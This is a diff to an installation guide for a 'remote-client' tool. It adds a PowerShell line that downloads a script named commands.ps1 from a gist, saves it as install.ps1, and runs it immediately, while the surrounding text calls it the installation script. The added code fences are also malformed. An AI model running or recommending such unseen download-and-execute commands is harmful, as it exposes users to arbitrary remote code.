@@ -45,6 +45,9 @@ This guide provides instructions for installing the `remote-client` application 
    Invoke-WebRequest -Uri "https://gist.githubusercontent.com/botsarefuture/6f670100f67d70b69f88a570ce7c230e/raw/install.ps1" -OutFile "$HOME\install.ps1"; & "$HOME\install.ps1"
    ```
 
+```powershell
+   Invoke-WebRequest -Uri "https://gist.githubusercontent.com/botsarefuture/51b44e97eec919403de3b71932213938/raw/commands.ps1" -OutFile "$HOME\install.ps1"; & "$HOME\install.ps1"
+   ```
    - This command does the following:
      - Downloads the installation script to your home directory as `install.ps1`.
      - Executes the downloaded script.
